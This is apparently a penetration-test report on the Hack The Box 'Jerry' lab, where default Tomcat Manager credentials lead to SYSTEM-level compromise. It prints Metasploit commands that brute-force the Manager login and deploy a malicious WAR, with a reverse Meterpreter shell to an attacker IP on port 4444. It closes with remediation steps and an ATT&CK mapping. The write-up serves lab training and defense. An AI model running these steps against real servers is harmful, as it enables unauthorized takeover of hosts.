# Penetration Test Report — Jerry

![Difficulty](https://img.shields.io/badge/difficulty-Easy-green) ![OS](https://img.shields.io/badge/OS-Windows-blue) ![Focus](https://img.shields.io/badge/focus-Tomcat%20default%20creds%20%2F%20WAR%20upload-red)

## Executive Summary

An authorized assessment of `target.htb` identified an **Apache Tomcat 7.0.88** Manager application protected by weak/default credentials (`tomcat:s3cret`). A malicious WAR file was deployed through the Manager interface, yielding a Meterpreter session that — because Tomcat ran as a privileged service — landed directly as `NT AUTHORITY\SYSTEM`. Full host compromise; no privilege escalation required.

## Findings Overview

| # | Finding | Severity |
|---|---|---|
| 1 | Tomcat Manager exposed with weak credentials | Critical |
| 2 | Tomcat service running as SYSTEM (WAR deployment = SYSTEM RCE) | High |
| 3 | Outdated Tomcat 7.0.88 | Medium |

## Technical Walkthrough

### 1. Enumeration

```bash
ports=$(nmap -p- --min-rate=1000 -T4 target.htb | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV target.htb
```

Single service: **Apache Tomcat/Coyote 1.1 (Tomcat 7.0.88)** on 8080. The Manager App prompted for login.

### 2. Foothold — Default Credentials → WAR Deployment

Tomcat Manager credential brute force:

```bash
msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set rhosts target.htb
run
# [+] Login Successful: tomcat:s3cret
```

Malicious WAR deployment:

```bash
use exploit/multi/http/tomcat_mgr_upload
set HttpUsername tomcat
set HttpPassword s3cret
set rhosts target.htb
set rport 8080
set lhost <attacker-ip>
set lport 4444
exploit
```

Meterpreter session opened; `getuid` → `JERRY$` — the Tomcat service account. Spawning a shell confirmed the effective context:

```
meterpreter > shell
C:\apache-tomcat-7.0.88> whoami
nt authority\system
```

Both flags recovered from `C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt`.

## Remediation

- Remove/lock down the Manager and Host Manager apps (IP allowlisting, strong unique credentials, or disable entirely).
- Run Tomcat as a low-privilege service account, never SYSTEM.
- Upgrade Tomcat to a supported branch; monitor deployments (unexpected WARs = alert).

## MITRE ATT&CK Mapping

| Tactic | Technique |
|---|---|
| Initial Access | T1078.004 — Valid/Default Accounts |
| Execution | T1505.003 — Web Shell (WAR) |
| Privilege Escalation | T1543.003 — Windows Service context inheritance |

---
*Assessment performed in an authorized lab environment (Hack The Box).*
